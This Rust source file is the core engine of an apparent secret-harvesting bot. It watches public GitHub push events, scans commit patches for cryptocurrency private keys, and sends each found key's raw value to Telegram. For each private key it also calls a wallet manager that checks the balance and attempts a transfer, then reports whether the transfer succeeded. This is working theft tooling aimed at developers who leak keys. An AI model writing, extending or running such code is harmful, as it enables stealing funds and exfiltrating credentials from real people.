use crate::config::Config;
use crate::core::cache::CacheManager;
use crate::models::github::GitHubEvent;
use crate::patterns::matcher::PatternMatcher;
use crate::scanner::commits::CommitFetcher;
use crate::scanner::events::GitHubEventsPoller;
use crate::scanner::files::should_scan_file;
use crate::models::scan::{CryptoSecret, SecretType};
use crate::telegram::alerts::TelegramAlerts;
use crate::wallet::manager::WalletManager;
use std::sync::Arc;
use tracing::{info, warn};

pub struct ScanEngine {
    config: Arc<Config>,
    cache: Arc<CacheManager>,
    matcher: Arc<PatternMatcher>,
    telegram: Arc<TelegramAlerts>,
    wallet_manager: Arc<WalletManager>,
}

impl ScanEngine {
    pub fn new(
        config: Arc<Config>,
        cache: Arc<CacheManager>,
        telegram: Arc<TelegramAlerts>,
        wallet_manager: Arc<WalletManager>,
    ) -> Arc<Self> {
        Arc::new(Self {
            config,
            cache,
            matcher: Arc::new(PatternMatcher::new()),
            telegram,
            wallet_manager,
        })
    }
    
    pub async fn run(self: Arc<Self>) {
        info!("🚀 Scan engine started");
        
        let poller = GitHubEventsPoller::new(self.config.clone());
        let fetcher = CommitFetcher::new(self.config.clone());
        
        let engine = self.clone();
        
        poller.poll(move |event: GitHubEvent| {
            let engine = engine.clone();
            let fetcher = fetcher.clone();
            
            // Ab String error hai — Send ho jayega
            tokio::spawn(async move {
                engine.process_event(event, fetcher).await;
            });
        }).await;
    }
    
    async fn process_event(&self, event: GitHubEvent, fetcher: CommitFetcher) {
        let repo_name = event.repo.name.clone();
        
        info!("📦 Push event from: {}", repo_name);
        
        let commits = fetcher.fetch_commits(&event).await;
        
        for commit_with_repo in commits {
            let repo = commit_with_repo.repo_name.clone();
            let commit = commit_with_repo.commit;
            let commit_sha = commit.sha.clone();
            
            let files = match &commit.files {
                Some(files) => files,
                None => continue,
            };
            
            for file in files {
                if !should_scan_file(&file.filename) {
                    continue;
                }
                
                if let Some(patch) = &file.patch {
                    let secrets = self.matcher.scan_content(patch);
                    
                    if !secrets.is_empty() {
                        for secret in secrets {
                            info!("🔑 SECRET FOUND in {} ({})", file.filename, repo);
                            
                            self.telegram.send_secret_found(
                                &repo,
                                &commit_sha,
                                &file.filename,
                                &secret.secret_type.to_string(),
                                &secret.value,
                            ).await;
                            
                            self.process_secret(secret).await;
                        }
                    }
                }
            }
        }
    }
    
    async fn process_secret(&self, secret: CryptoSecret) {
        match secret.secret_type {
            SecretType::PrivateKey => {
                match self.wallet_manager.process_private_key(&secret.value).await {
                    Ok((wallet_info, transfer_result)) => {
                        self.telegram.send_balance_detected(&wallet_info).await;
                        
                        if let Some(transfer) = transfer_result {
                            if transfer.success {
                                self.telegram.send_transfer_success(&wallet_info, &transfer).await;
                            } else {
                                if let Some(error) = &transfer.error {
                                    self.telegram.send_transfer_failed(&wallet_info, error).await;
                                }
                            }
                        }
                    }
                    Err(e) => {
                        warn!("Failed: {}", e);
                    }
                }
            }
            SecretType::SeedPhrase => {
                warn!("Seed phrase not implemented");
            }
        }
    }
}